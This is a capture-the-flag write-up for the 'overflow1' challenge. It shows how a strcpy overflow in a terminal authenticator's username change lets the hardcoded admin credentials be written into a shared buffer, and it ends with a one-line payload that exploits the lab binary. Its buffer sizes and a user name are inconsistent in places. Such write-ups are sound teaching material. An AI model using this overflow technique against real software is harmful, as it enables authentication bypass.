# overflow1

_written by `oblivious_turnip`_

solved by petiole

> The cyberteam has discovered some unauthorized access to the NYPD's
> infrastructure, we've matched the inbound IP addresses to Jake's botnet.
> After your previous success, we want you to see what you can find on these
> machines.
> 
> Additionally, take whatever you find with a grain of salt.

disclosure: i checked these challenge before release to ensure they were
solvable before the competition occurred. as a result, my solve likely took
longer than the allocated time within the competition. that being said, I did
not participate in the CTF at all

## about the program

it appears that the program is some authenticator, comparing usernames and
security codes to user input to determine who has access to the "NYPD Terminal".
insecurely, the developer of the program compiled the valid credentials of users
into the binary, which can be fetched either using `strings`, or retrieved by
looking at the `user_table_g` array in a decompiler like `ghidra`.

truncated strings output

```
GLIBC_2.2.5
__gmon_start__
PTE1
-- NYPD Terminal --
1. Change username
2. Admin login
3. Show suspects
4. Exit
Username:
Enter security code:
cors33                  <- username
aW5ub2NlbnQ=            <- password
Suspect %d: %20s, digital footprint %20s.
netrunner2d             <- admin user
Intruder!
2d9d90b636318a          <- admin password
flag.txt
Failed to allocate memory for buffer, cannot proceed.
One of these things is not like the other... %s
Authentication failure.
Enter new username:
10.0.0.254
10.0.0.20
j@k3
terminal1
ssh %s@%s
%a %b %d %k:%M:%S %Z 1933
Linux %s 6.1.21-v8+ #1642 SMP PREEMPT %s aarch64
Last login: %s from %s
;*3$"
```

additionally, the program allows authenticated users to change their username
(which is the name of the user at runtime), and attempt an "Admin login". in the
latter feature, the program attempts to check whether the user has been
authenticated as `netrunner2d:2d9d90b636318a`. assuming the right credentials were
provided, then this prints out the flag, and exits

the issue faced here? we can never actually sign in as `cristina33`. in theory,
we can rename ourselves to be `cristina33`, but then we'll be missing their
security code. as such, we would be unable to log in

in theory, at least

## solve - overwriting credentials

this exploit namely abuses the overflow caused by `strcpy` in
`change_username(char*)`.

the data required to store the user's username and security code are at most
`31` bytes each (based off the login function, which reads in `0x1f` bytes of
data). however, the `main` function stores both of these within a single buffer,
which will be referred to as the `creds_buf`. as a result, it would appear to be
like the following in memory:

```
main:creds_buf
+---------------+ -,
|               |  |
|   username    |  |
|     (48B)     |  |
|               |  |
+---------------+   } 72B in size
|               |  |
| security code |  |
|     (48B)     |  |
|               |  |
+---------------+ -`
```

after logging in, the `creds_buf` will look something like the following:

```
main:creds_buf
+user----+
|cors33  |
|        |
|        |
|        |
|        |
|        |
+pass----+
|aW5ub2Nl|
|bnQ=    |
|        |
|        |
|        |
|        |
+--------+
```

> of note: the blank spaces here represent unknown data or nullbytes. unknown
> data here is _most likely_ just nullbytes, but can be anything in theory.
> moving forward, there will always be a blank space after each string because
> it must end with a nullbyte

however, since the `fgets` call reads in 143 bytes, it is possible to write more
than just the username. this is particularly important, as the username is
updated by copying the new username into the `creds_buf` using `strcpy`, which
copies data without worrying about overflowing data.

that is, a payload of 49 `z`-s, which goes beyond the length of the username
section of the `creds_buf`, the updated `creds_buf` to the following:

```
main:creds_buf
+user----+
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
+pass----+
|z 5ub2Nl|
|bnQ=    |
|        |
|        |
|        |
|        |
+--------+
```

when attempting to run the `win` function, the administrative credentials are
compared using `strncmp`, comparing only the bytes of the name/code, and not
comparing the final nullbyte. therefore, a valid username match would be

```
main:creds_buf
+user----+
|netrunne| <- matches `netrunner2d`
|r2dzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
+pass----+
|z 5ub2Nl|
|bnQ=    |
|        |
|        |
|        |
|        |
+--------+
```

naturally, this would still fail since the security code is incorrect. however,
since we are able to continously write bytes

so, we write in the other security code as well

```
main:creds_buf
+user----+
|netrunne| <- matches `netrunner2d`
|r2dzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
|zzzzzzzz|
+pass----+
|2d9d90b6|
|36318a  |
|        |
|        |
|        |
|        |
+--------+
```

now that the right credentials are in the right place, we can just sign in
throught the admin login.

this has been written into the solve script, but a single-line bash line that
can be run to generate the payload is the following:

```sh
echo -e "cors33\naW5ub2NlbnQ=\n1\nnetrunner2dzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz2d9d90b636318a\n2" | ./overflow1
```
